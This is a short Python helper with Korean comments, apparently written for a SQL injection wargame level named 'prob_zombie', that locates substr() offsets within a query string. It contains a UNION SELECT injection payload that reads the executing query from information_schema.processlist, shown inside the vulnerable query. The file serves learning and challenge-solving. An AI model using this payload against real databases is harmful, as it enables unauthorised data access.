# substr()함수에 사용될 위치를 파악하는 함수
def get_substr_offset(target, string):
    index = string.find(target)
    if (index == -1):
        return (-1, -1)
    return (index + 1, len(target) + 1)


# 전체 쿼리에서 union 구문이 들어가는 위치 값을 코드를 이용해 찾는다.
if __name__ == "__main__":
    target = "' union select substr(info,XX,XX) from information_schema.processlist--"
    query = "select pw from prob_zombie where pw='' union select substr(info,XX,XX) from information_schema.processlist-- '"

    print("Location:", get_substr_offset(target, query))
